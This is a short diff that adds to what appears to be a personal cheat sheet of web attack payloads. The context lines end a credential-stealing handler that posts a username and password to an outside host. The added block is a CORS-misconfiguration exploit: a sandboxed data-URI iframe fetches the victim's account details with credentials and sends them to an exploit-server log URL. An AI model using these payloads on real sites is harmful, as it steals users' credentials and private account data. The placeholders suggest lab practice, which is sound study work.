@@ -4,3 +4,18 @@ method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
 });"> 
+
+
+####
+#CORS
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+   var req = new XMLHttpRequest ();
+   req.onload = reqListener;
+   req.open('get','$url/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe> 
